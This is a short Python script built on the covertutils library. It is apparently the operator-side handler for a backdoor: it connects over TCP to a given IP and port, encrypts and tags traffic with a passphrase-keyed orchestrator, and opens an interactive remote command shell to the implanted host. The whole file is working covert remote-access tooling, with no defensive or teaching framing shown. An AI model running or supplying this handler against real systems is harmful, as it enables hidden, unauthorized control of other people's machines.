#!/usr/bin/env python
from covertutils.handlers import BaseHandler
from covertutils.orchestration import SimpleOrchestrator
from covertutils.shells.impl import StandardShell

from hashlib import sha512
import sys
import socket
from time import sleep

try :
	program, ip, port, passphrase = sys.argv
except :
	print( """Usage:
	%s <ip> <port> <passphrase>""" % sys.argv[0] )
	sys.exit(1)

client_addr = ip, int(port)

orch = SimpleOrchestrator( passphrase, tag_length = 2, out_length = 50, in_length = 50, cycling_algorithm = sha512 )

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect( client_addr )

def recv () :
	return s.recv(50)

def send( raw ) :
	return s.send( raw )


class MyHandler( BaseHandler ) :

	def onChunk( self, stream, message ) :
		pass

	def onMessage( self, stream, message ) :
		# The PrintShell class will automatically handle the response (print it to the user)
		pass

	def onNotRecognised( self ) :
		print( "Got Garbage!" )

handler = MyHandler( recv, send, orch )

shell = StandardShell(handler, prompt = "(%s:%d)> " % client_addr )
shell.start()
